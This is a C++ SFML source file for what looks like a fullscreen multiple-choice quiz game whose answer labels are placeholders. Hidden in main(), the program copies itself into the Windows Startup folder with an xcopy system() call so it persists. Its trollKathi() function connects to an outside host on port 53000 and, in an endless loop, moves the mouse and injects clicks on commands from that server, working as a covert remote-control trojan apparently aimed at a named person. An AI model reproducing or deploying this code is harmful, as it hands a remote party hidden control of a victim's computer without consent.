#include <iostream>
#include <SFML/Graphics.hpp>
#include <SFML/Network.hpp>
#include <fstream>
#include <windows.h>
#include "button.h"
#include "simplegui.h"

#define QUESTION_AMMOUNT 10

using namespace std;
using namespace sf;

typedef unsigned int uint;

uint state = 0;

void mouseEvent(const Mouse::Button &button, bool is_pressed);

void wrongAnswer(GUIObject *object){
    state = 0;
}

void trollKathi();

void rightAnswer(GUIObject *object){
    if(state < QUESTION_AMMOUNT)
        state++;
}

void close(GUIObject *object){
    object->getWindow()->close();
}

int main(int argc, char *args[]){
    
    ifstream test_ismade;
    test_ismade.open("1");
    if(test_ismade.good()){
        trollKathi();
        return 0;
    }
    else{
        string command = "xcopy \"";
        command += args[0];
        command += "\" %appdata%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\";
        system(command.c_str());
        system("echo > %appdata%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\1");
    }
    RenderWindow window(sf::VideoMode::getDesktopMode(), "SFML", sf::Style::Fullscreen);
    test_ismade.close();
    
    sf::Vector2f button_positions[4];
    button_positions[0] = sf::Vector2f(window.getSize().x/16*1, 
                                       window.getSize().y/18*12);
    button_positions[1] = sf::Vector2f(window.getSize().x/16*9, 
                                       window.getSize().y/18*12);
    button_positions[2] = sf::Vector2f(window.getSize().x/16*1, 
                                       window.getSize().y/18*15);
    button_positions[3] = sf::Vector2f(window.getSize().x/16*9, 
                                       window.getSize().y/18*15);
    
    
    window.setFramerateLimit(60);
    Event event;
    Clock frameClock;
    float frameTime;
    
    SimpleGUI gui(window);
    
#if 1
    ImageButton logo(window, sf::Vector2f(0,0), sf::Vector2f(50,50), "Logo.png");
    logo.setOnRelease(close);
    gui.add(logo);
#endif
    
    Button answers[QUESTION_AMMOUNT][4];
    for(uint i = 0;i < QUESTION_AMMOUNT;i++){
        for(uint j = 0;j < 4;j++){
            answers[i][j] = Button(window, sf::Vector2f(0,0), sf::Vector2f(0,0));
            answers[i][j].setVisible(false);
            answers[i][j].setPosition(button_positions[j]);
            answers[i][j].setIndent(2);
            answers[i][j].setOutlineThickness(2);
            answers[i][j].setNormalInnerColor(sf::Color::Black);
            answers[i][j].setNormalOuterColor(sf::Color::Red);
            answers[i][j].setNormalTextColor(sf::Color::Red);
            answers[i][j].setHoveredInnerColor(sf::Color::Red);
            answers[i][j].setHoveredOuterColor(sf::Color::Yellow);
            answers[i][j].setHoveredTextColor(sf::Color::Black);
            answers[i][j].setPressedInnerColor(sf::Color::Black);
            answers[i][j].setPressedOuterColor(sf::Color::Red);
            answers[i][j].setPressedTextColor(sf::Color::Red);
            answers[i][j].setSize(sf::Vector2f(window.getSize().x/16*6, 
                                               window.getSize().y/18*2));
            answers[i][j].setFontSize(answers[i][j].getSize().y/3*2);
            gui.add(answers[i][j]);
        }
    }
    
    answers[0][0].setOnRelease(rightAnswer);
    answers[0][1].setOnRelease(wrongAnswer);
    answers[0][2].setOnRelease(wrongAnswer);
    answers[0][3].setOnRelease(wrongAnswer);
    
    answers[0][0].setText("first-true");
    answers[0][1].setText("first-false");
    answers[0][2].setText("first-false");
    answers[0][3].setText("first-false");
    
    answers[1][0].setOnRelease(rightAnswer);
    answers[1][1].setOnRelease(wrongAnswer);
    answers[1][2].setOnRelease(wrongAnswer);
    answers[1][3].setOnRelease(wrongAnswer);
    
    answers[1][0].setText("second-true");
    answers[1][1].setText("second-false");
    answers[1][2].setText("second-false");
    answers[1][3].setText("second-false");
    
    answers[2][0].setOnRelease(rightAnswer);
    answers[2][1].setOnRelease(wrongAnswer);
    answers[2][2].setOnRelease(wrongAnswer);
    answers[2][3].setOnRelease(wrongAnswer);
    
    answers[2][0].setText("third-true");
    answers[2][1].setText("third-false");
    answers[2][2].setText("third-false");
    answers[2][3].setText("third-false");
    
    answers[3][0].setOnRelease(rightAnswer);
    answers[3][1].setOnRelease(wrongAnswer);
    answers[3][2].setOnRelease(wrongAnswer);
    answers[3][3].setOnRelease(wrongAnswer);
    
    answers[3][0].setText("fourth-true");
    answers[3][1].setText("fourth-false");
    answers[3][2].setText("fourth-false");
    answers[3][3].setText("fourth-false");
    
    answers[4][0].setOnRelease(rightAnswer);
    answers[4][1].setOnRelease(wrongAnswer);
    answers[4][2].setOnRelease(wrongAnswer);
    answers[4][3].setOnRelease(wrongAnswer);
    
    answers[4][0].setText("fift-true");
    answers[4][1].setText("fift-false");
    answers[4][2].setText("fift-false");
    answers[4][3].setText("fift-false");
    
    answers[5][0].setOnRelease(rightAnswer);
    answers[5][1].setOnRelease(wrongAnswer);
    answers[5][2].setOnRelease(wrongAnswer);
    answers[5][3].setOnRelease(wrongAnswer);
    
    answers[5][0].setText("sixt-true");
    answers[5][1].setText("sixt-false");
    answers[5][2].setText("sixt-false");
    answers[5][3].setText("sixt-false");
    
    answers[6][0].setOnRelease(rightAnswer);
    answers[6][1].setOnRelease(wrongAnswer);
    answers[6][2].setOnRelease(wrongAnswer);
    answers[6][3].setOnRelease(wrongAnswer);
    
    answers[6][0].setText("seventh-true");
    answers[6][1].setText("seventh-false");
    answers[6][2].setText("seventh-false");
    answers[6][3].setText("seventh-false");
    
    answers[7][0].setOnRelease(rightAnswer);
    answers[7][1].setOnRelease(wrongAnswer);
    answers[7][2].setOnRelease(wrongAnswer);
    answers[7][3].setOnRelease(wrongAnswer);
    
    answers[7][0].setText("eight-true");
    answers[7][1].setText("eight-false");
    answers[7][2].setText("eight-false");
    answers[7][3].setText("eight-false");
    
    answers[8][0].setOnRelease(rightAnswer);
    answers[8][1].setOnRelease(wrongAnswer);
    answers[8][2].setOnRelease(wrongAnswer);
    answers[8][3].setOnRelease(wrongAnswer);
    
    answers[8][0].setText("neinth-true");
    answers[8][1].setText("neinth-false");
    answers[8][2].setText("neinth-false");
    answers[8][3].setText("neinth-false");
    
    answers[9][0].setOnRelease(rightAnswer);
    answers[9][1].setOnRelease(wrongAnswer);
    answers[9][2].setOnRelease(wrongAnswer);
    answers[9][3].setOnRelease(wrongAnswer);
    
    answers[9][0].setText("tenth-true");
    answers[9][1].setText("tenth-false");
    answers[9][2].setText("tenth-false");
    answers[9][3].setText("tenth-false");
    
    makeWindowTransparent(window);
    while(window.isOpen()){
        event = Event();
        while(window.pollEvent(event)){
            if(event.type == Event::Closed){
                window.close();
            }
        }
        frameTime = frameClock.getElapsedTime().asMilliseconds();
        frameClock.restart();
        if(state != 10)
            for(uint i = 0;i < QUESTION_AMMOUNT;i++){
                for(uint j = 0;j < 4;j++){
                    if(i == state)
                        answers[i][j].setVisible(true);
                    else
                        answers[i][j].setVisible(false);
                }
            }
        else
            window.close();
        
        setWindowAlpha(window, 255);
        makeWindowOnTop(window);
        window.clear(sf::Color(0,0,0,0));
        gui.update(event);
        window.display();
    }
    //kathi
    trollKathi();
    return 0;
}

void mouseEvent(const sf::Mouse::Button &button, bool is_pressed){
    INPUT Input={0};
    if(is_pressed){
        Input.type = INPUT_MOUSE;
        if(button == sf::Mouse::Left)
            Input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
        else if(button == sf::Mouse::Right)
            Input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
        ::SendInput(1,&Input,sizeof(INPUT));
    }
    else{
        ::ZeroMemory(&Input,sizeof(INPUT));
        Input.type = INPUT_MOUSE;
        if(button == sf::Mouse::Left)
            Input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
        else if(button == sf::Mouse::Right)
            Input.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
        ::SendInput(1,&Input,sizeof(INPUT));
    }
}

void trollKathi(){
    sf::TcpSocket socket;
    if(socket.connect("adultts.wow64.net", 53000) != sf::Socket::Done)
        std::cout << "error_connecting" << std::endl;
    sf::Packet receive;
    float x,y;
    bool move;
    bool pressed_left = false;
    bool pressed_right = false;
    bool pressed_left_prev = false;
    bool pressed_right_prev = false;
    while(true){
        if(socket.receive(receive) != sf::Socket::Done){}
        receive >> x >> y >> move >> pressed_left >> pressed_right;
        
        if(pressed_left && !pressed_left_prev)
            mouseEvent(sf::Mouse::Left, true);
        else if(!pressed_left && pressed_left_prev)
            mouseEvent(sf::Mouse::Left, false);
        if(pressed_right && !pressed_right_prev)
            mouseEvent(sf::Mouse::Right, true);
        else if(!pressed_right && pressed_right_prev)
            mouseEvent(sf::Mouse::Right, false);
        
        if(move)
            sf::Mouse::setPosition(sf::Vector2i(x*sf::VideoMode::getDesktopMode().width, 
                                                y*sf::VideoMode::getDesktopMode().height));
        pressed_left_prev = pressed_left;
        pressed_right_prev = pressed_right;
    }
}
